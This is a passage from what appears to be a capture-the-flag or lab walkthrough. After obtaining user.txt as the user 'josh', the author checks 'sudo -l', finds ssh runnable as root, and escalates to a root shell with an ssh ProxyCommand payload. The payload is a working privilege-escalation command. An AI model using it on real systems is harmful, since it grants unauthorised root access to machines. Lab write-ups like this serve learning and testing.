
as josh we get user.txt

## enumeration
`sudo -l` we find it can run ssh as root so 

## payload
```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

and we get root